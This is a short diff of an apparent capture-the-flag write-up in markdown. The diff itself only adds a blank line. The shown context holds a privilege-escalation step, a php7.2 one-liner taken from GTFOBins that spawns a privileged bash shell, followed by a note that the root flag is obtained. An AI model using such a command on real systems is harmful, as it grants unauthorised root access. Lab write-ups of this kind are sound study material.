@@ -57,4 +57,5 @@ we search **php7.2** on **GTFOBins**
 `/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"`
 
 here we get the root flag
+
 ![](9.png)
